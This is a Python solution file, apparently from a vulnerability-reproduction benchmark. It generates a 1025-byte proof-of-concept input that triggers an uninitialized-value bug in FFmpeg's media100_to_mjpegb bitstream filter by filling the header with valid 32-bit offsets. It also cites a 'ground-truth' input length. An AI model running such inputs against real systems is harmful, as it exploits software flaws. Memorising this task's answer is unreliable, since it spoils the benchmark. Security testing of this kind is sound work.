import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Uninitialized Value vulnerability in bsf/media100_to_mjpegb.
        
        The vulnerability is caused by uninitialized padding in the output packet allocated by the
        media100_to_mjpegb bitstream filter. To trigger it, we need to provide an input that the
        filter successfully processes (or attempts to process sufficiently to allocate output).
        
        The filter typically parses a Media100 header which contains offsets to video fields.
        These offsets are read as 32-bit Big Endian integers. By filling the header area with
        valid offsets pointing within the buffer (e.g., 512), we satisfy bounds checks.
        """
        # Ground-truth PoC length is 1025 bytes
        length = 1025
        payload = bytearray(length)
        
        # Create a valid 32-bit Big Endian offset value.
        # 512 (0x200) is a safe middle value for a 1025-byte buffer.
        safe_offset = struct.pack('>I', 512)
        
        # Fill the first 128 bytes with this safe offset.
        # This ensures that whichever index (0, 4, 8, 12...) represents the field offset,
        # it will be read as 512, which is valid ( > header_size and < total_size).
        for i in range(0, 128, 4):
            payload[i:i+4] = safe_offset
            
        return bytes(payload)